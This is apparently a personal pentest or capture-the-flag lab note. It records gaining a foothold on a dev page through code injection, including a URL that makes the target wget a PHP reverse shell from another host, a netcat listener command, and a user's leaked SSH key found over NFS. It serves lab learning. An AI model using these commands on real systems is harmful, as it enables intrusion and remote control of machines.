- Initial foothold was found with `code / template injection` on dev page.
  [[HTTP - 8080]]
- Let's get a shell:
- `http://192.168.157.131:8080/dev/pages/hello241.php?0=wget%20192.168.1.10:8000/shell.php` => pentest monkey shell
- `nc -lnvp 9001`
- ![[Pasted image 20250325142728.png]]
- Another user `jeanpaul` found
- ![[Pasted image 20250325142811.png]]
- This is the same user `jp` that left us note and `id_rsa` for its ssh in [[NFS - 111, 2049]]